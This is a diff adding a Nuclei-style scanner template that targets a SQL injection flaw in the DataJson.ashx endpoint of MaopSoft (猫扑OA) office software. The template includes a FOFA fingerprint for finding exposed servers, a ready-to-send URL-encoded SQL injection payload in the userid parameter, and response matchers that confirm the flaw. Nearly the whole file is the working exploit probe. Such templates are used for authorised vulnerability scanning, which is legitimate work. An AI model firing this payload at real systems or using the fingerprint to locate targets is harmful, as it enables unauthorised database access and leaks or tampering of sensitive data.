@@ -1,0 +1,28 @@
+id: maopu-oa-datajson-sqli
+
+info:
+  name: 猫扑OA DataJson.ashx SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="您是MaopSoft的VIP客户"
+      该组件在处理DataJson.ashx接口参数时存在SQL语法解析缺陷，攻击者可通过构造恶意输入执行任意SQL语句，导致数据库敏感信息泄露或篡改。此漏洞利用无需用户交互，且可能绕过常规输入验证机制。
+  tags: 猫扑OA
+
+http:
+- raw:
+  - |
+    GET /api/Html/Document/DataJson.ashx?userid=-8575+OR+2250+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%282250%3D2250%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29 HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+    Accept-Encoding: gzip, deflate
+    Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+    Connection: keep-alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'qvjxq'
